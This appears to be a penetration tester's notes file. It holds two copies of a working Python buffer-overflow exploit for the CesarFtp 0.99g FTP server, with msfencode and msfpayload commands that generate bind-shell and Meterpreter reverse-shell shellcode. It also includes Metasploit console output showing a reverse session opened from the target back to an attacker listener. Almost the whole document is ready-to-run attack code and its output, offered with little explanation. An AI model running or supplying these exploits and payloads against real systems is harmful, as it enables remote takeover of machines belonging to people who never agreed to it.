# pentest_script

```
cat w32-bind-ngs-shellcode.bin | /pentest/exploits/framework3/msfencode -e x86/shikata_ga_nai -b "\x00\x20\x0a\x0d" -t c

shellcode = "\xdd\xc7\x29\xc9\xb1\x36\xbd\x17\x3b\x1b\x51\xd9\x74\x24\xf4"+
"\x58\x31\x68\x19\x83\xc0\x04\x03\x68\x15\xf5\xce\x2a\x98\x9d"+            
"\xbb\x3c\x2a\xd6\xca\xb2\xc1\x9e\x2e\x40\xbb\x56\xc4\x28\x64"+            
"\xed\xec\xec\x2b\xe9\x65\xfe\xe5\x61\xb4\x5f\x35\x43\xd0\x39"+            
"\x6f\xd4\x53\xae\x38\x95\x9d\xb6\xce\x4f\x28\xc5\xf9\x43\x7a"+            
"\x06\x70\xbc\xab\x65\x29\x03\x05\xcb\x7f\xd4\xf4\x48\x90\xf6"+            
"\x52\x01\xe4\x5b\xa7\x15\xa6\x7e\xaf\x28\xbc\x0b\x04\x0b\x43"+            
"\xe2\xcd\x7a\x91\xb6\x7a\x48\x84\x37\x93\x05\x90\x9b\x5f\x17"+            
"\xf5\x27\xa3\xa6\x70\x50\xe6\x6f\x0e\x75\x49\xfb\xbb\xad\x77"+            
"\x12\x34\x1a\x63\xb5\xc0\x2f\x90\x34\x3e\x26\x40\x35\xc4\xa9"+            
"\x3a\xba\xfa\xc0\x49\xb3\x8f\x8c\xb5\x90\x70\xe0\xe1\x83\x0f"+            
"\x3e\x7d\xd9\xbe\x60\x2c\xde\x11\x31\xd1\xf1\x07\xc8\x01\x0c"+            
"\xd8\x45\x6e\x9a\x37\x0e\x3c\x0f\xc7\x60\xbb\x70\x43\x78\xf5"+            
"\xa2\xfe\x10\x95\x2f\x9b\xc0\xd4\xcc\x47\x38\x4c\x87\x23\xfe"+            
"\xd5\x31\x32\xaa\x5e\xfd\x11\x05\x33\xac\x0b\x6f\xf4\xbf\xa4"+            
"\x38\xa9\x6d\xe2\x94\xb2\xc4\xe8\x93\x0b\x15\x19\x69\x6c\x1a"+
"\x25"

```

```
#!/usr/bin/python
#CesarFtp 0.99g 0day Exploit
#Tested on XP SP3 English
#Bug found by h07 [h07@interia.pl]
#Date: 10.06.2006
#Edited : Bind shell 28876

from socket import *

shellcode = (
"\xdd\xc7\x29\xc9\xb1\x36\xbd\x17\x3b\x1b\x51\xd9\x74\x24\xf4"+
"\x58\x31\x68\x19\x83\xc0\x04\x03\x68\x15\xf5\xce\x2a\x98\x9d"+            
"\xbb\x3c\x2a\xd6\xca\xb2\xc1\x9e\x2e\x40\xbb\x56\xc4\x28\x64"+            
"\xed\xec\xec\x2b\xe9\x65\xfe\xe5\x61\xb4\x5f\x35\x43\xd0\x39"+            
"\x6f\xd4\x53\xae\x38\x95\x9d\xb6\xce\x4f\x28\xc5\xf9\x43\x7a"+            
"\x06\x70\xbc\xab\x65\x29\x03\x05\xcb\x7f\xd4\xf4\x48\x90\xf6"+            
"\x52\x01\xe4\x5b\xa7\x15\xa6\x7e\xaf\x28\xbc\x0b\x04\x0b\x43"+            
"\xe2\xcd\x7a\x91\xb6\x7a\x48\x84\x37\x93\x05\x90\x9b\x5f\x17"+            
"\xf5\x27\xa3\xa6\x70\x50\xe6\x6f\x0e\x75\x49\xfb\xbb\xad\x77"+            
"\x12\x34\x1a\x63\xb5\xc0\x2f\x90\x34\x3e\x26\x40\x35\xc4\xa9"+            
"\x3a\xba\xfa\xc0\x49\xb3\x8f\x8c\xb5\x90\x70\xe0\xe1\x83\x0f"+            
"\x3e\x7d\xd9\xbe\x60\x2c\xde\x11\x31\xd1\xf1\x07\xc8\x01\x0c"+            
"\xd8\x45\x6e\x9a\x37\x0e\x3c\x0f\xc7\x60\xbb\x70\x43\x78\xf5"+            
"\xa2\xfe\x10\x95\x2f\x9b\xc0\xd4\xcc\x47\x38\x4c\x87\x23\xfe"+            
"\xd5\x31\x32\xaa\x5e\xfd\x11\x05\x33\xac\x0b\x6f\xf4\xbf\xa4"+            
"\x38\xa9\x6d\xe2\x94\xb2\xc4\xe8\x93\x0b\x15\x19\x69\x6c\x1a"+
"\x25"
)

def intel_order(i):
    a = chr(i % 256)
    i = i >> 8
    b = chr(i % 256)
    i = i >> 8
    c = chr(i % 256)
    i = i >> 8
    d = chr(i % 256)
    str = "%c%c%c%c" % (a, b, c, d)
    return str

host = "192.168.1.170"
port = 21
user = "ftp"
password = "ftp"
EIP = 0x7CB32D69 #jmp esp <shell32.dll XP sp2 polish>

s = socket(AF_INET, SOCK_STREAM)
s.connect((host, port))
print s.recv(1024)

s.send("user %s\r\n" % (user))
print s.recv(1024)

s.send("pass %s\r\n" % (password))
print s.recv(1024)

buffer = "MKD "
buffer += "\n" * 671
buffer += "A" * 3 + "\x53\x93\x42\x7e"
buffer += "\x90" * 40  + shellcode
buffer += "\r\n"

print "len: %d" % (len(buffer))

s.send(buffer)
print s.recv(1024)

s.close()

#EoF 

# milw0rm.com [2006-06-12]


```
```
https://code.google.com/archive/p/w32-bind-ngs-shellcode/
```
```
https://www.rapid7.com/db/modules/payload/windows/shell/reverse_ord_tcp
msfpayload windows/meterpreter/reverse_ord_tcp LHOST=192.168.1.1 LPORT=443 R | msfencode -b "\x00\x20\x0a\x0d" -s 250

```
```
root@kali:~/Desktop# msfpayload windows/meterpreter/reverse_ord_tcp LHOST=192.168.1.15 LPORT=443 R | msfencode -b "\x00\x20\x0a\x0d" -s 250
[-] cmd/powershell_base64 failed: Encoding failed due to a bad character (index=74, char=0x00)
[*] x86/shikata_ga_nai succeeded with size 120 (iteration=1)

buf = 
"\xb8\xa3\x74\xbf\xf3\xd9\xc0\xd9\x74\x24\xf4\x5a\x29\xc9" +
"\xb1\x18\x83\xea\xfc\x31\x42\x0f\x03\x42\xac\x96\x4a\x0f" +
"\x83\x8d\xd1\x7b\xa0\x01\x91\x3c\x2a\xe9\xf5\xa0\xb9\xff" +
"\x7e\xaa\x9d\x52\x2d\x05\xde\xaa\x13\xa8\xd3\xed\x59\xb9" +
"\xfc\x99\xf4\x49\x89\xdb\x34\xc1\xc1\xe6\x3c\x5e\x95\xe5" +
"\xa0\x61\xcc\x7d\x99\x39\x0f\x6a\x91\xcb\x33\x6b\x48\x28" +
"\x22\x67\xc7\x45\xb5\x1d\xe5\x66\x65\x76\x81\x58\x2d\x78" +
"\x5d\x31\x2f\x7b\x60\x7a\xa6\x9a\x31\xcb\xb4\x0f\xe7\x64" +
"\x95\xc5\x17\xda\x42\x4c\xe7\x39"

msf exploit(handler) > exploit

[*] Started reverse handler on 192.168.1.15:443 
[*] Starting the payload handler...
[*] Transmitting intermediate stager for over-sized stage...(216 bytes)
[*] Sending stage (770048 bytes) to 192.168.1.170
[*] Meterpreter session 1 opened (192.168.1.15:443 -> 192.168.1.170:1121) at 2016-05-04 12:45:35 -0400

msf exploit(handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_ord_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (accepted: seh, thread, process, none)
   LHOST     192.168.1.15     yes       The listen address
   LPORT     443              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf exploit(handler) > 

#!/usr/bin/python
#CesarFtp 0.99g 0day Exploit
#Proof of Concept: execute calc.exe
#Tested on XP sp2 polish
#Bug found by h07 [h07@interia.pl]
#Date: 10.06.2006

from socket import *

#msfpayload windows/meterpreter/reverse_ord_tcp LHOST=192.168.1.15 LPORT=443 R | msfencode -b "\x00\x20\x0a\x0d" -s 250
shellcode = ("\xb8\xa3\x74\xbf\xf3\xd9\xc0\xd9\x74\x24\xf4\x5a\x29\xc9" +
"\xb1\x18\x83\xea\xfc\x31\x42\x0f\x03\x42\xac\x96\x4a\x0f" +
"\x83\x8d\xd1\x7b\xa0\x01\x91\x3c\x2a\xe9\xf5\xa0\xb9\xff" +
"\x7e\xaa\x9d\x52\x2d\x05\xde\xaa\x13\xa8\xd3\xed\x59\xb9" +
"\xfc\x99\xf4\x49\x89\xdb\x34\xc1\xc1\xe6\x3c\x5e\x95\xe5" +
"\xa0\x61\xcc\x7d\x99\x39\x0f\x6a\x91\xcb\x33\x6b\x48\x28" +
"\x22\x67\xc7\x45\xb5\x1d\xe5\x66\x65\x76\x81\x58\x2d\x78" +
"\x5d\x31\x2f\x7b\x60\x7a\xa6\x9a\x31\xcb\xb4\x0f\xe7\x64" +
"\x95\xc5\x17\xda\x42\x4c\xe7\x39")

def intel_order(i):
    a = chr(i % 256)
    i = i >> 8
    b = chr(i % 256)
    i = i >> 8
    c = chr(i % 256)
    i = i >> 8
    d = chr(i % 256)
    str = "%c%c%c%c" % (a, b, c, d)
    return str

host = "192.168.1.170"
port = 21
user = "ftp"
password = "ftp"
EIP = 0x7CB32D69 #jmp esp <shell32.dll XP sp2 polish>

s = socket(AF_INET, SOCK_STREAM)
s.connect((host, port))
print s.recv(1024)

s.send("user %s\r\n" % (user))
print s.recv(1024)

s.send("pass %s\r\n" % (password))
print s.recv(1024)

buffer = "MKD "
buffer += "\n" * 671
buffer += "A" * 3 + "\x53\x93\x42\x7e"
buffer += "\x90" * 40  + shellcode
buffer += "\r\n"

print "len: %d" % (len(buffer))

s.send(buffer)
print s.recv(1024)

s.close()

#EoF 

# milw0rm.com [2006-06-12]


```


Scripts and Cheatsheets
